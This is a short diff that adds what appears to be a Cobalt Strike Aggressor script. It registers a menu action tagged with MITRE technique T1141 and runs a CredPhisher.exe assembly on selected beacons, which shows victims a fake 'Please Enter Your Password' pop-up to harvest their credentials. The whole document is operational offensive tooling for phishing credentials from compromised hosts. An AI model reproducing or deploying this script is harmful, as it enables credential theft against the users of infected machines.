@@ -1,0 +1,13 @@
+#Run CredPhisher
+					
+	item "Prompt for Username and Password  - T1141"{
+		local('$bid');
+			foreach $bid ($1){
+				credphisher($bid);
+			}
+		}
+
+# Phish Users with small pop up box
+sub credphisher{
+bexecute_assembly($1, script_resource('/exe/CredPhisher.exe'), '"Please Enter Your Password"');
+}
